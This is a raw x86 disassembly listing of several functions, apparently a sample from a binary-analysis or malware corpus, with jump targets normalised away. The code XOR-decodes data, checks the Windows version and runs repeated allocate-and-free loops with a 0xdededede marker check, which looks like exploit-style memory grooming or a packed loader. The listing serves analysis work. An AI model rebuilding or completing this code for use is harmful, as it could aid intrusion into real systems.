sub_401000
cmp [ esi ] 0x0
push ebx
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
add eax 0x2
push eax
call sub_4046a3
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx 0xffffffff
jle r-xdata
mov eax [ esi + 0x8 ]
mov al [ eax ]
mov ecx [ esi ]
xor al [ ecx ]
mov [ ebx ] al
mov eax ebx
pop ebx
retn
push edi
xor edx edx
mov eax ecx
div [ esi + 0xc ]
mov eax [ esi + 0x8 ]
mov edi [ esi ]
mov al [ edx + eax ]
xor al [ edi + ecx - 0x1 ]
xor al [ edi + ecx ]
mov [ ecx + ebx ] al
dec ecx
cmp ecx 0xffffffff
jg r-xdata
pop edi
sub_401059
push ebp
mov ebp esp
mov eax 0xabe4
call sub_40af20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
push 0xabe0
lea eax [ ebp - 0xabe4 ]
push 0xffffffde
push eax
call sub_407580
mov edi 0x270
add esp 0xc
mov ebx edi
add ebx 0x4
cmp ebx 0x1210
jb r-xdata
push [ eax + ebx ]
call [ esi + 0x5c ]
mov eax [ esi + 0xdc ]
cmp [ eax + ebx ] 0x0
je r-xdata
mov eax [ esi + 0xdc ]
push 0xfa0
add eax edi
push 0x0
push eax
call sub_407580
add esp 0xc
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_404645
leave
retn
add edi 0x4
cmp edi 0x1210
jb r-xdata
lea eax [ ebp - 0xabe4 ]
push eax
push 0x20
push 0x1
push 0x64
push 0x6e
call [ esi + 0x60 ]
mov ecx [ esi + 0xdc ]
mov [ edi + ecx ] eax
mov eax [ esi + 0xdc ]
cmp [ edi + eax ] 0x0
je r-xdata
sub_401104
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
xor eax eax
lea edi [ ebp - 0x14 ]
stosd [ edi ]
mov eax [ esi + 0xdc ]
cmp [ eax ] 0x0
pop edi
mov [ ebp - 0x14 ] ecx
je r-xdata
mov [ ebp - 0x10 ] ecx
lea ecx [ ebp - 0x14 ]
push ecx
push 0x8
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x10 ] edx
push 0x10
jmp r-xdata
push [ eax + 0x1c ]
call [ esi + 0x54 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi + 0xdc ]
push 0x4
push [ eax + 0x26c ]
call [ esi + 0x58 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
xor ecx ebp
call sub_404645
leave
retn
sub_40116e
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
xor eax eax
lea edi [ ebp - 0x14 ]
stosd [ edi ]
mov eax [ esi + 0xdc ]
cmp [ eax ] 0x0
pop edi
mov [ ebp - 0x14 ] ecx
je r-xdata
mov [ ebp - 0x10 ] ecx
lea ecx [ ebp - 0x14 ]
push ecx
push 0x8
push [ eax + 0x1c ]
call [ esi + 0x54 ]
lea eax [ ebp - 0x14 ]
push eax
push 0x4
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0x14 ]
push ecx
push 0x10
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x10 ] edx
push [ eax + 0x1c ]
call [ esi + 0x54 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x14 ]
push eax
push 0x8
jmp r-xdata
mov eax [ esi + 0xdc ]
mov [ ebp - 0x14 ] ebx
push [ eax + 0x26c ]
call [ esi + 0x54 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
xor ecx ebp
call sub_404645
leave
retn
sub_4011ed
push ebp
mov ebp esp
mov eax 0xb1904
call sub_40af20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov edi 0xb18f8
xor ebx ebx
push edi
lea eax [ ebp - 0xb18fc ]
push ebx
push eax
mov [ ebp - 0xb1904 ] ebx
call sub_407580
mov eax [ esi ]
lea ecx [ eax + 0xc6e ]
mov edx ecx
sub edx eax
push 0x9bf67
lea eax [ ebp + edx - 0xb256a ]
push ecx
push eax
call sub_4071f0
add esp 0x18
mov [ ebp - 0xb1900 ] ebx
mov eax [ ebp - 0xb1900 ]
push [ ebp + eax - 0xb18fc ]
call [ esi + 0xb0 ]
add [ ebp - 0xb1900 ] 0x4
add [ ebp - 0xb1904 ] eax
cmp [ ebp - 0xb1900 ] edi
jb r-xdata
push [ ebp - 0xb1904 ]
call [ esi + 0xb0 ]
mov ecx [ esi ]
mov [ ecx + 0x716 ] eax
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_404645
leave
retn
sub_4012a9
push ebp
mov ebp esp
mov eax 0x203a4
call sub_40af20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x203a0
lea eax [ ebp - 0x203a4 ]
push 0xffffffde
push eax
call sub_407580
add esp 0xc
lea eax [ ebp - 0x203a4 ]
push eax
push 0x20
push 0x1
push 0x12f
push 0x6e
call [ esi + 0x60 ]
mov ecx [ esi + 0xdc ]
mov [ ecx + 0x1210 ] eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404645
leave
retn
sub_401303
push ebp
mov ebp esp
sub esp 0xa4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0xa4 ] 0x0
push edi
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov edi 0x9c
push edi
lea eax [ ebp - 0xa0 ]
push 0x0
push eax
call sub_407580
add esp 0xc
lea eax [ ebp - 0xa0 ]
push eax
mov [ ebp - 0xa0 ] edi
call [ esi + 0x6c ]
test eax eax
je r-xdata
lea eax [ ebp - 0xa4 ]
push eax
call [ esi + 0x68 ]
push eax
call edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_404645
leave
retn
xor eax eax
inc eax
cmp [ ebp - 0x9c ] 0x5
jne r-xdata
push 0x6
pop edx
cmp [ ebp - 0x9c ] edx
jne r-xdata
cmp [ ebp - 0x98 ] eax
jne r-xdata
mov eax [ esi + 0xdc ]
mov ecx [ ebp - 0xa4 ]
mov [ eax ] ecx
cmp [ ebp - 0x98 ] 0x0
jne r-xdata
mov ecx [ esi + 0xdc ]
mov [ ecx + 0x14 ] eax
cmp [ ebp - 0x98 ] eax
jne r-xdata
mov ecx [ esi + 0xdc ]
mov [ ecx + 0x10 ] eax
cmp [ ebp - 0x9c ] edx
jne r-xdata
cmp [ ebp - 0x98 ] 0x2
jne r-xdata
mov ecx [ esi + 0xdc ]
mov [ ecx + 0x4 ] eax
cmp [ ebp - 0x9c ] edx
jne r-xdata
mov edi [ esi + 0xdc ]
mov [ edi + 0x8 ] eax
cmp [ ebp - 0x9c ] edx
jne r-xdata
cmp [ ebp - 0x98 ] 0x2
jne r-xdata
mov ecx [ esi + 0xdc ]
mov [ ecx + 0xc ] eax
sub_401403
push ebp
mov ebp esp
mov eax 0x40c04
call sub_40af20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x40be4 ] 0x0
push ebx
push esi
push edi
xor eax eax
lea edi [ ebp - 0x4062c ]
mov esi ecx
stosd [ edi ]
call [ esi + 0x94 ]
mov eax [ esi ]
mov edi 0xb8638
mov ecx rw-data
add eax 0x706
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec edi
jne r-xdata
mov eax [ esi ]
add eax 0x587
push eax
call [ esi + 0x8c ]
call sub_401303
call sub_4024f6
mov eax [ esi + 0xdc ]
cmp [ eax + 0x3c ] edi
jne r-xdata
mov eax esi
call sub_40248e
call sub_4023a0
jmp r-xdata
lea eax [ ebp - 0x40a24 ]
push eax
push 0x20
push 0x1
push 0xa
push 0x11
lea eax [ ebp - 0x4077c ]
push eax
push 0x20
push 0x1
push 0x7
push 0xc
jmp r-xdata
mov edi 0x9c
push edi
lea eax [ ebp - 0x40be0 ]
push 0x0
push eax
call sub_407580
add esp 0xc
push 0x6
pop ebx
push 0x1
push 0x2
push 0x0
mov [ ebp - 0x40be0 ] edi
mov edi [ VerSetConditionMask@IAT ]
push 0x0
mov [ ebp - 0x40bdc ] ebx
mov [ ebp - 0x40bd8 ] 0x3
call edi
push 0x1
push 0x1
push edx
push eax
call edi
push edx
push eax
push 0x3
lea eax [ ebp - 0x40be0 ]
push eax
call [ esi + 0xa4 ]
neg eax
sbb eax eax
and eax 0xffffe580
add eax 0xfffffa80
push eax
mov [ ebp - 0x40c00 ] eax
mov eax [ esi ]
add eax 0x596
push eax
lea eax [ ebp - 0x604 ]
push 0x400
push eax
call [ esi + 0xbc ]
add esp 0x10
lea eax [ ebp - 0x604 ]
push eax
call [ esi + 0x8c ]
mov eax [ esi + 0xdc ]
push 0xfa0
add eax 0x270
push 0x0
push eax
call sub_407580
mov eax [ esi + 0xdc ]
add esp 0xc
cmp [ eax ] 0x0
je r-xdata
push edx
push ecx
call [ esi + 0x70 ]
push eax
call [ esi + 0x4 ]
call eax
mov eax [ eax + 0x94 ]
call sub_401293
jmp r-xdata
call [ esi + 0x60 ]
mov ecx [ esi + 0xdc ]
mov edi 0x20009
push edi
mov [ ecx + 0x26c ] eax
lea eax [ ebp - 0x20610 ]
push 0x0
push eax
call sub_407580
push edi
xor edi edi
lea eax [ ebp - 0x4061c ]
push edi
push eax
call sub_407580
push 0x150
lea eax [ ebp - 0x4077c ]
push edi
push eax
call sub_407580
push 0x2a8
lea eax [ ebp - 0x40a24 ]
push edi
push eax
call sub_407580
mov eax [ esi ]
lea ecx [ eax + 0xa7 ]
lea edi [ eax + 0xbd ]
lea edx [ eax + 0x5a0 ]
add eax 0x5b4
mov [ ebp - 0x40be8 ] eax
mov eax [ esi + 0xdc ]
add esp 0x30
cmp [ eax ] 0x0
je r-xdata
push 0xa4
lea eax [ ebp - 0x40b44 ]
push 0x0
push eax
call sub_407580
mov eax [ esi + 0xdc ]
mov [ ebp - 0x40b0c ] 0x6e
mov [ ebp - 0x40b08 ] 0x64
mov [ ebp - 0x40b04 ] 0xabe0
mov edi [ eax + 0x1214 ]
lea edx [ eax + 0x26c ]
movzx ecx [ edx ]
imul ecx ecx 0x18
mov ecx [ ecx + edi ]
add ecx 0x48
mov [ ebp - 0x40af4 ] ecx
mov [ ebp - 0x40afc ] ecx
movzx ecx [ edx ]
mov eax [ eax + 0x1214 ]
imul ecx ecx 0x18
mov eax [ ecx + eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x40ae4 ] ebx
mov [ ebp - 0x40af0 ] eax
mov [ ebp - 0x40af8 ] eax
mov [ ebp - 0x40aec ] 0x1b8
mov [ ebp - 0x40ae0 ] 0x10000
mov [ ebp - 0x40ad4 ] 0x4800200
xor ebx ebx
push 0x7c
lea eax [ ebp - 0x40aa0 ]
push 0x0
push eax
call sub_407580
mov eax [ esi + 0xdc ]
mov [ ebp - 0x40a80 ] 0x6e
mov [ ebp - 0x40a7c ] 0x64
mov [ ebp - 0x40a78 ] 0xabe0
movzx ecx [ eax + 0x26c ]
mov eax [ eax + 0x1214 ]
add ecx ecx
mov eax [ eax + ecx * 8 ]
add eax 0x2c
add esp 0xc
mov [ ebp - 0x40a64 ] ebx
mov [ ebp - 0x40a70 ] eax
mov [ ebp - 0x40a74 ] eax
mov [ ebp - 0x40a6c ] 0x1b8
mov [ ebp - 0x40a60 ] 0x10000
mov [ ebp - 0x40a58 ] 0x4800000
xor ebx ebx
push [ ebp - 0x40be8 ]
mov ecx [ esi + 0xdc ]
push edi
mov [ ecx + 0x1214 ] eax
call [ esi + 0x70 ]
push eax
call [ esi + 0x4 ]
mov [ ebp - 0x40bfc ] eax
mov eax [ esi + 0xdc ]
push [ eax + 0x1214 ]
mov eax [ esi ]
add eax 0x5c3
push eax
lea eax [ ebp - 0x204 ]
push 0x100
push eax
call [ esi + 0xbc ]
add esp 0x10
lea eax [ ebp - 0x204 ]
push eax
call [ esi + 0x8c ]
mov eax [ esi + 0xdc ]
cmp [ eax ] 0x0
jne r-xdata
movzx eax [ ebp + ebx - 0x40b44 ]
push eax
call [ esi + 0xb4 ]
mov ecx [ esi ]
mov [ ecx + ebx + 0x174f5 ] ax
add ebx 0x2
cmp ebx 0xa4
jb r-xdata
call sub_4011ed
push 0x64
pop edi
movzx eax [ ebp + ebx - 0x40aa0 ]
push eax
call [ esi + 0xb4 ]
mov ecx [ esi ]
mov [ ecx + ebx + 0x174f9 ] ax
add ebx 0x2
cmp ebx 0x7c
jb r-xdata
jmp r-xdata
lea eax [ ebp - 0x40a24 ]
push eax
push 0x20
push 0x1
push 0xa
push 0x11
lea eax [ ebp - 0x4077c ]
push eax
push 0x20
push 0x1
push 0x7
push 0xc
jmp r-xdata
mov eax [ esi + 0xdc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ esi ]
add eax 0x5d7
mov [ ebp - 0x40c04 ] eax
call [ esi + 0x60 ]
dec edi
jne r-xdata
dec edi
jne r-xdata
mov eax [ esi ]
add eax 0x609
push eax
mov bl 0x1
call [ esi + 0x8c ]
and [ ebp - 0x4062c ] 0x0
lea eax [ ebp - 0x4062c ]
push eax
mov eax [ esi ]
push 0x0
push 0xb8638
add eax 0x706
push eax
call [ esi + 0xb8 ]
test eax eax
je r-xdata
test bl bl
je r-xdata
mov eax [ esi ]
add eax 0x668
push eax
call [ esi + 0x8c ]
mov eax [ esi + 0xdc ]
cmp [ eax ] edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_404645
leave
retn
lea eax [ ebp - 0x40a24 ]
push eax
push 0x20
push 0x1
push 0xa
push 0x11
lea eax [ ebp - 0x4077c ]
push eax
push 0x20
push 0x1
push 0x7
push 0xc
jmp r-xdata
mov ecx [ ecx + 0x1214 ]
add eax eax
mov ecx [ ecx + eax * 8 ]
imul eax eax 0x18
mov edx ecx
mov ecx [ edx + 0x1214 ]
mov ecx [ eax + ecx ]
mov [ ebp - 0x4062c ] ecx
mov edx [ edx + 0x1214 ]
mov eax [ eax + edx + 0x4 ]
mov [ ebp - 0x40628 ] eax
jmp r-xdata
call [ esi + 0x60 ]
mov ecx [ esi + 0xdc ]
cmp [ ecx ] 0x0
movzx eax ax
je r-xdata
dec [ ebp - 0x40be8 ]
jne r-xdata
mov eax [ esi ]
add eax 0x609
push eax
call [ esi + 0x8c ]
lea ebx [ ecx + 0x4000 ]
lea edi [ ecx - 0x4000 ]
mov [ ebp - 0x40bf0 ] ebx
mov [ ebp - 0x40be8 ] 0xf
and [ ebp - 0x4062c ] 0x0
lea eax [ ebp - 0x4062c ]
push eax
mov eax [ esi ]
push 0x0
push 0xb8638
add eax 0x706
push eax
call [ esi + 0xb8 ]
test eax eax
je r-xdata
mov eax edi
cmp edi ebx
jmp r-xdata
mov [ ebp - 0x40bf8 ] eax
jb r-xdata
mov ebx [ esi + 0xdc ]
xor edi edi
mov [ ebp - 0x4061c ] eax
cmp [ ebx ] edi
je r-xdata
jmp r-xdata
push 0x20009
lea eax [ ebp - 0x20610 ]
push edi
push eax
call sub_407580
add esp 0xc
lea eax [ ebp - 0x20610 ]
push eax
lea eax [ ebp - 0x4061c ]
cmp [ ebx ] edi
je r-xdata
mov eax [ ebp - 0x40628 ]
mov [ ebp - 0x40618 ] eax
cmp [ ebp - 0x40be4 ] 0x0
je r-xdata
push 0xc
push eax
push 0xc
push 0x10
push eax
push 0x10
jmp r-xdata
push 0xf
xor bl bl
pop edi
mov eax [ esi ]
add eax 0x609
push eax
call [ esi + 0x8c ]
xor ebx ebx
push 0x20009
lea eax [ ebp - 0x4061c ]
push ebx
or edi 0xffffffff
push eax
mov [ ebp - 0x40be4 ] ebx
mov [ ebp - 0x40bf4 ] ebx
mov [ ebp - 0x40bf0 ] edi
call sub_407580
mov eax [ ebp - 0x40bf8 ]
mov [ ebp - 0x4061c ] eax
mov eax [ esi + 0xdc ]
add esp 0xc
cmp [ eax ] ebx
je r-xdata
mov eax [ ebp - 0x40bf8 ]
add eax 0x8
cmp eax [ ebp - 0x40bf0 ]
mov eax [ esi + 0xdc ]
cmp [ eax ] edi
lea eax [ ebp - 0x20608 ]
jne r-xdata
push 0x250a
push [ ebp - 0x40c04 ]
push edi
call [ ebp - 0x40bfc ]
cmp eax 0xffffff21
je r-xdata
mov eax 0xffff
mov [ ebp - 0x40618 ] ax
mov eax 0xfffd
mov [ ebp - 0x40614 ] ax
mov eax [ ebp - 0x40628 ]
mov [ ebp - 0x40618 ] eax
jmp r-xdata
mov edi [ esi ]
push 0x8
pop ebx
sub edi eax
lea eax [ ebp - 0x2060c ]
xor eax eax
inc eax
mov [ ebp - 0x40bec ] ecx
mov [ ebp - 0x40bf8 ] eax
cmp ecx eax
jbe r-xdata
inc ecx
add eax 0x4
cmp ecx 0x3e8
jb r-xdata
mov ebx 0xb000
movzx edx dl
movzx eax cl
sub eax edx
jmp r-xdata
inc eax
test ebx ebx
jne r-xdata
or eax 0xffffffff
cmp edi eax
je r-xdata
mov eax ecx
cdq
sub eax edx
mov [ ebp - 0x40be8 ] eax
sar [ ebp - 0x40be8 ] 0x1
mov eax 0x274
cmp [ eax ] 0x0
je r-xdata
test eax eax
je r-xdata
mov cl [ eax ]
mov dl [ edi + eax + 0x5ff ]
dec ebx
cmp cl dl
jne r-xdata
xor eax eax
cmp [ ebp - 0x40bf4 ] 0x0
mov eax [ esi + 0xdc ]
jne r-xdata
inc [ ebp - 0x40bf8 ]
mov ecx [ ebp - 0x40bf8 ]
add eax 0x4
cmp ecx [ ebp - 0x40bec ]
jb r-xdata
mov ecx [ esi + 0xdc ]
cmp [ ecx ] 0x0
mov ebx [ ecx + 0x1214 ]
movzx edx [ eax + ecx - 0x4 ]
movzx ecx [ eax + ecx ]
je r-xdata
mov [ ebp - 0x40be4 ] 0x1
push [ eax + edi * 4 + 0x278 ]
call [ esi + 0x5c ]
mov eax [ esi + 0xdc ]
push [ eax + edi * 4 + 0x274 ]
call [ esi + 0x5c ]
mov eax [ esi + 0xdc ]
push [ eax + edi * 4 + 0x270 ]
push [ eax + edi * 4 + 0x270 ]
call [ esi + 0x5c ]
mov eax [ esi + 0xdc ]
push [ eax + edi * 4 + 0x274 ]
call [ esi + 0x5c ]
mov eax [ esi + 0xdc ]
push [ eax + edi * 4 + 0x278 ]
jmp r-xdata
mov ecx [ ebp - 0x40be8 ]
cmp [ ebp - 0x40bf8 ] ecx
jb r-xdata
jmp r-xdata
add edx edx
mov edx [ ebx + edx * 8 ]
add ecx ecx
mov ebx [ ebx + ecx * 8 ]
imul edx edx 0x18
imul ecx ecx 0x18
mov edx [ edx + ebx ]
mov ebx [ ecx + ebx ]
jmp r-xdata
mov eax [ esi ]
add eax 0x5eb
push eax
call [ esi + 0x8c ]
push 0x0
call sub_4049a6
xor ecx ecx
cmp [ eax ] ecx
je r-xdata
call [ esi + 0x5c ]
call sub_4012a9
mov eax [ esi + 0xdc ]
mov ecx [ eax + 0x1210 ]
mov [ ebp - 0x40bec ] ecx
test ecx ecx
je r-xdata
mov ebx 0xb000
sub edx ebx
cmp edx 0xb000
jne r-xdata
cmp [ ebp - 0x40bf4 ] 0x1
jne r-xdata
mov ecx ebx
sub ecx edx
cmp ecx 0xb000
jne r-xdata
movzx ecx [ eax + 0x1c ]
mov eax [ eax + 0x1214 ]
add ecx ecx
mov eax [ eax + ecx * 8 ]
mov [ ebp - 0x4062c ] eax
movzx edi [ eax + 0x1c ]
imul edi edi 0x18
lea ecx [ eax + 0x1214 ]
mov ebx [ ecx ]
mov edi [ edi + ebx ]
mov [ ebp - 0x40624 ] edi
mov [ ebp - 0x4062c ] edi
movzx eax [ eax + 0x1c ]
mov ecx [ ecx ]
imul eax eax 0x18
mov eax [ eax + ecx + 0x4 ]
mov [ ebp - 0x40620 ] eax
jmp r-xdata
cmp [ ebp - 0x40bf4 ] ecx
mov ecx [ eax + 0x1214 ]
jne r-xdata
cmp [ ebp - 0x40bf4 ] ecx
mov ecx [ eax + 0x1214 ]
jne r-xdata
and [ ebp - 0x40be4 ] 0x0
cmp [ ebp - 0x40bf4 ] 0x0
jne r-xdata
and [ ebp - 0x40bf4 ] 0x0
jmp r-xdata
and [ ebp - 0x40be4 ] 0x0
push 0x8
push 0x10
jmp r-xdata
mov [ ebp - 0x40628 ] eax
xor edi edi
lea eax [ ebp - 0x4062c ]
push eax
cmp [ edx ] edi
je r-xdata
movzx edx [ eax + edi * 4 + 0x27c ]
movzx edx [ eax + edi * 4 + 0x26c ]
jmp r-xdata
movzx edx [ eax + edi * 4 + 0x27c ]
jmp r-xdata
movzx edx [ eax + edi * 4 + 0x26c ]
mov edi [ ebp - 0x40bf8 ]
add edi 0xfffffffb
mov [ ebp - 0x40bf0 ] edi
mov [ ebp - 0x40bf4 ] 0x1
and [ ebp - 0x40be4 ] 0x0
inc [ ebp - 0x40be4 ]
jmp r-xdata
mov [ ebp - 0x40a8c ] ecx
mov [ ebp - 0x40aa0 ] ecx
lea ecx [ ebp - 0x40aa0 ]
push ecx
push 0x7c
mov [ ebp - 0x40b24 ] ecx
mov [ ebp - 0x40b44 ] ecx
lea ecx [ ebp - 0x40b44 ]
push ecx
push 0xa4
jmp r-xdata
push [ edx + 0x1c ]
call [ esi + 0x54 ]
mov eax [ esi + 0xdc ]
mov ecx [ eax + 0x1c ]
cmp [ eax ] edi
je r-xdata
call sub_401059
mov eax [ esi + 0xdc ]
xor ecx ecx
add eax 0x270
push [ ebp - 0x40bec ]
call [ esi + 0x5c ]
mov eax [ esi + 0xdc ]
cmp [ eax ] 0x0
lea eax [ ebp - 0x20610 ]
push eax
lea ecx [ ebp - 0x4061c ]
mov eax 0x20009
jne r-xdata
movzx eax [ eax + 0x1210 ]
add edx edx
mov edx [ ecx + edx * 8 ]
add eax eax
add edx ebx
cmp [ ecx + eax * 8 ] edx
movzx eax [ eax + 0x1210 ]
imul edx edx 0x18
mov edx [ edx + ecx ]
imul eax eax 0x18
add edx ebx
cmp [ eax + ecx ] edx
jmp r-xdata
jne r-xdata
cmp [ ebp - 0x40be4 ] 0x9
je r-xdata
movzx ecx [ eax + 0x270 ]
mov edx [ eax + 0x1214 ]
add ecx ecx
mov ecx [ edx + ecx * 8 ]
mov [ ebp - 0x40628 ] ecx
mov [ ebp - 0x4062c ] ecx
lea ecx [ ebp - 0x4062c ]
push ecx
push 0x8
movzx edi [ eax + 0x270 ]
mov ebx [ eax + 0x1214 ]
imul edi edi 0x18
mov edi [ edi + ebx ]
mov [ ebp - 0x40624 ] edi
mov [ ebp - 0x4062c ] edi
movzx ecx [ eax + 0x270 ]
mov edx [ eax + 0x1214 ]
imul ecx ecx 0x18
mov ecx [ ecx + edx + 0x4 ]
mov [ ebp - 0x40620 ] ecx
mov [ ebp - 0x40628 ] ecx
lea ecx [ ebp - 0x4062c ]
push ecx
push 0x10
jmp r-xdata
push [ eax + 0x26c ]
call [ esi + 0x54 ]
mov eax [ esi + 0xdc ]
cmp [ eax ] edi
je r-xdata
push eax
push ecx
push eax
push 0x2514
push [ ebp - 0x40c04 ]
push 0x0
call [ ebp - 0x40bfc ]
cmp [ ebp - 0x40bf4 ] 0x0
mov eax [ esi + 0xdc ]
jne r-xdata
add eax 0xfffffffc
or eax 0xffffffff
jmp r-xdata
mov eax [ esi + 0xdc ]
movzx edx [ eax + 0x270 ]
mov edi [ eax + 0x1214 ]
test ecx ecx
je r-xdata
push [ eax + 0x1c ]
call [ esi + 0x54 ]
mov edi 0x100
push edi
lea eax [ ebp - 0x104 ]
push 0xffffffde
push eax
call sub_407580
add esp 0xc
lea eax [ ebp - 0x104 ]
push eax
mov eax [ esi + 0xdc ]
push edi
push [ eax + 0x26c ]
call [ esi + 0x58 ]
mov eax [ esi + 0xdc ]
mov ecx [ eax ]
mov eax ecx
neg eax
sbb eax eax
and eax 0x1c
cmp [ ebp + eax - 0xd8 ] 0xdededede
mov [ ebp - 0x40bfc ] ecx
je r-xdata
mov ecx [ eax + edi * 4 + 0x27c ]
mov ecx [ eax + edi * 4 + 0x26c ]
jmp r-xdata
mov eax [ ebp - 0xd8 ]
add edx edx
sub eax [ edi + edx * 8 ]
mov eax [ ebp - 0xbc ]
imul edx edx 0x18
sub eax [ edx + edi ]
jmp r-xdata
cmp [ ebp - 0xfc ] 0x44
cmp [ ebp - 0xf4 ] 0x30
jmp r-xdata
push 0x100
mov [ eax + 0x1c ] ecx
lea eax [ ebp - 0x104 ]
push 0x0
push eax
call sub_407580
add esp 0xc
lea eax [ ebp - 0x104 ]
push eax
mov eax [ esi + 0xdc ]
push 0x100
push [ eax + 0x1c ]
call [ esi + 0x58 ]
mov eax [ esi + 0xdc ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x40bf4 ] 0x0
jne r-xdata
cmp [ ebp - 0x40bf4 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x40bf0 ]
add eax 0xabe0
test ecx ecx
mov ecx [ esi + 0xdc ]
mov edx [ ecx + 0x1214 ]
je r-xdata
mov edx [ esi + 0xdc ]
cmp [ edx ] 0x0
mov eax edx
je r-xdata
push 0xfa0
add eax 0x270
push 0x0
push eax
call sub_407580
mov eax [ esi + 0xdc ]
add esp 0xc
mov [ eax + 0x18 ] 0x1
jmp r-xdata
je r-xdata
movzx edi [ ecx + ebx * 4 + 0x280 ]
movzx ebx [ ecx + ebx * 4 + 0x284 ]
add edi edi
mov edi [ edx + edi * 8 ]
add ebx ebx
mov ebx [ edx + ebx * 8 ]
mov [ ebp - 0x40bec ] edx
mov edx [ ebp - 0x40bf0 ]
movzx ecx [ ecx + edx * 4 + 0x27c ]
mov edx [ ebp - 0x40bec ]
movzx edi [ ecx + ebx * 4 + 0x268 ]
movzx ebx [ ecx + ebx * 4 + 0x26c ]
add edi edi
mov edi [ edx + edi * 8 ]
add ebx ebx
mov ebx [ edx + ebx * 8 ]
mov [ ebp - 0x40bec ] edx
mov edx [ ebp - 0x40bf0 ]
movzx ecx [ ecx + edx * 4 + 0x264 ]
mov edx [ ebp - 0x40bec ]
jmp r-xdata
movzx edi [ ecx + ebx * 4 + 0x280 ]
movzx ebx [ ecx + ebx * 4 + 0x284 ]
imul edi edi 0x18
mov edi [ edi + edx ]
imul ebx ebx 0x18
mov ebx [ ebx + edx ]
mov [ ebp - 0x40bec ] edx
mov edx [ ebp - 0x40bf0 ]
movzx ecx [ ecx + edx * 4 + 0x27c ]
mov edx [ ebp - 0x40bec ]
jmp r-xdata
movzx edi [ ecx + ebx * 4 + 0x268 ]
movzx ebx [ ecx + ebx * 4 + 0x26c ]
imul edi edi 0x18
mov edi [ edi + edx ]
imul ebx ebx 0x18
mov ebx [ ebx + edx ]
mov [ ebp - 0x40bec ] edx
mov edx [ ebp - 0x40bf0 ]
movzx ecx [ ecx + edx * 4 + 0x264 ]
mov edx [ ebp - 0x40bec ]
mov [ ebp - 0x40628 ] ebx
push 0x8
mov [ ebp - 0x40624 ] ebx
push 0x10
jmp r-xdata
add ecx ecx
mov ecx [ edx + ecx * 8 ]
imul ecx ecx 0x18
mov ecx [ ecx + edx ]
jmp r-xdata
add ebx eax
add ecx eax
add edi eax
cmp [ ebp - 0x40bfc ] 0x0
lea eax [ ebp - 0x4062c ]
push eax
mov eax [ esi + 0xdc ]
mov [ ebp - 0x40be4 ] ecx
mov [ ebp - 0x4062c ] ebx
je r-xdata
cmp eax ecx
je r-xdata
add eax 0x4
cmp eax ecx
jb r-xdata
push [ eax + 0x1c ]
call [ esi + 0x54 ]
lea eax [ ebp - 0x104 ]
push eax
mov eax [ esi + 0xdc ]
push 0x100
push [ eax + 0x26c ]
call [ esi + 0x58 ]
mov ecx [ esi + 0xdc ]
mov ecx [ ecx ]
xor edx edx
xor eax eax
test ecx ecx
setne dl
mov [ ebp - 0x40be8 ] edi
mov [ ebp - 0x40bfc ] ecx
mov ecx 0x100
lea edx [ edx * 4 + 0x4 ]
sub [ ebp - 0x40be8 ] edx
mov eax [ esi ]
add eax 0x61d
push eax
call [ esi + 0x8c ]
mov eax [ esi + 0xdc ]
mov ecx [ eax + 0x250 ]
add ecx [ eax + 0x20 ]
mov edx [ ebp - 0x40c00 ]
mov ebx eax
call sub_401104
mov edi eax
sub edi [ ebx + 0x250 ]
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebp - 0x40bfc ] 0x0
mov edx [ ebp - 0x40be4 ]
lea ecx [ ebp + eax - 0x104 ]
je r-xdata
mov edx [ ebp - 0x40be8 ]
add edx eax
cmp edx [ ebp + eax - 0x104 ]
je r-xdata
mov eax [ esi + 0xdc ]
mov ecx [ eax + 0x254 ]
mov edx [ ebp - 0x40be4 ]
add ecx edi
call sub_401104
mov edx [ ebp - 0x40be4 ]
cmp eax 0x4
mov eax [ esi + 0xdc ]
jne r-xdata
mov eax [ esi + 0xdc ]
mov ecx [ eax + 0x250 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x40c00 ]
lea ecx [ ecx + eax + 0x4 ]
call sub_401104
mov [ ebp - 0x40be4 ] eax
jmp r-xdata
lea edx [ edx + eax - 0x4 ]
lea eax [ ebx + eax - 0x4 ]
mov [ ecx ] edx
mov [ ecx - 0x4 ] eax
lea eax [ ebp - 0x4062c ]
push eax
mov [ ebp - 0x40628 ] edi
push 0x8
lea edx [ edx + eax - 0x8 ]
lea eax [ ebx + eax - 0x8 ]
mov [ ecx ] edx
